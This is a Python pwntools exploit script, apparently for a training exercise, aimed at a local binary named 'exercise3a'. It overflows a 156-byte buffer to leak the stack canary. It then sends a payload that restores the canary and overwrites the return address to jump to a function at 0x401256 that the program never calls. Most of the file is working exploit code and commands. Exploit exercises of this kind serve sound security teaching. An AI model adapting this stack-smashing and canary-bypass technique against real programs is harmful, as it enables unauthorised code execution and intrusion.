#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *
from pwnlib.tubes import buffer

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './exercise3a'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

r = start()

UNCALLABLE_ADDR = 0x401256
BUF_SIZE = 156
# end with \x0a(\n)
leak = cyclic(BUF_SIZE - 1) + b'\x0a'
r.send(leak)

# the \n at the end creates a new line when printed - skip it - the next line begins with the canary value
r.recvline_contains(cyclic(8))
canary_raw = r.recvline().split(b' is ')[0]
canary = int.from_bytes(canary_raw, byteorder='little')

payload = cyclic(BUF_SIZE)
payload += pack(canary, 64)
payload += cyclic(20)
payload += pack(UNCALLABLE_ADDR, 64)
payload += b'\x0a'

r.recvuntil(b'Enter the secret password:\n')
print(canary_raw)
r.send(payload)

# Exits gracefuly, with a segfault, we can recvall
a = r.recvall()
print(a)
# You can now communicate with the process, e.g.,
# r.sendline("AAAAA")
# r.recvline()

